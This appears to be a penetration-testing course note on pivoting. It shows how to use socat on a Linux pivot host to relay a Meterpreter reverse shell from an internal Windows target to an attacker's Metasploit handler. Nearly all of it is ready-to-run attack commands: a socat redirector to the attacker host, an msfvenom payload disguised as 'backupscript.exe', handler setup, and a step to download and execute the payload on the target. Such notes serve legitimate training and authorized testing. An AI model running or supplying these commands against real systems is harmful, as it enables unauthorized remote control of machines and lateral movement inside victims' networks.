# NOTE — Socat Redirection with a Reverse Shell

## ID
606

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
notes

## Title
Section 7 — Socat Redirection with a Reverse Shell

## Description
Use Socat on a pivot host as a bidirectional redirector to forward a reverse shell from an internal Windows target to your attack host, without requiring SSH tunneling.

## Tags
socat, pivoting, reverse-shell, redirection, port-forwarding

## Commands
- `socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80`
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> LPORT=8080 -f exe -o backupscript.exe`
- `use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 0.0.0.0; set lport 80; run`

## What This Section Covers
Socat is a versatile relay tool that creates pipes between two network channels without needing SSH. This section explains how to set up Socat on a Linux pivot host to listen for a reverse shell from an internal Windows target and forward it to your Metasploit handler. The payload is generated with the pivot’s IP as `LHOST`, and Socat handles the redirection. This method works even when the target cannot directly reach your attack host but can reach the pivot.

## Methodology
1. **On the pivot host (Ubuntu)** – start Socat listening on a port (e.g., 8080) and forward all traffic to your attack host’s IP on a specific port (e.g., 80).
2. **Generate payload** – use `msfvenom` with `LHOST` = pivot’s IP and `LPORT` = Socat listening port. The payload will connect back to the pivot.
3. **Start Metasploit handler** – listen on `0.0.0.0:80` (or the port you forwarded to).
4. **Transfer and execute payload** on the Windows target. Socat receives the connection and relays it to your handler.
5. **Receive Meterpreter session** – the shell arrives as if the target connected directly.

## Multi-step Workflow
```bash
# On pivot host (Ubuntu) - redirect connections from port 8080 to attacker:80
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.15:80

# On attack host - generate payload (LHOST = pivot's internal IP)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe

# On attack host - start handler
msfconsole
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_https
msf6> set lhost 0.0.0.0
msf6> set lport 80
msf6> run

# Transfer payload to pivot and serve it (or use other method)
# On Windows target - download and execute
# Reverse shell flows: Windows → pivot:8080 → socat → attacker:80 → handler

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[06-meterpreter-port-forwarding]] | [[09-plink-windows]] →
<!-- AUTO-LINKS-END -->
